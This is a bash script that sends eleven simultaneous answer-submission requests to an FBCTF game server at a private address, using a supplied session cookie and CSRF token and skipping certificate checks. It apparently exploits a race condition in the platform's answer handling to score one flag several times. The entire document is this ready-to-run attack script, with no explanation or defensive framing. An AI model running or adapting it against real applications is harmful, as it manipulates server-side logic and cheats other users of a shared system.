#!/bin/bash

CSRF_TOKEN=$1
SESSION=$2
FLAG=${3:-a}
LEVEL_ID=${4:-1}

for i in {0..10}; do
    curl 'https://10.10.10.5/index.php?p=game&ajax=true' -H "Cookie: Leaderboard=close; Announcements=close; Activity=close; Teams=close; Filter=close; Game Clock=close; FBCTF=$SESSION" -H 'Origin: https://10.10.10.5' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8,en-GB;q=0.6' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'Connection: keep-alive' --data "action=answer_level&level_id=$LEVEL_ID&answer=$FLAG&csrf_token=$CSRF_TOKEN" --compressed --insecure &
done
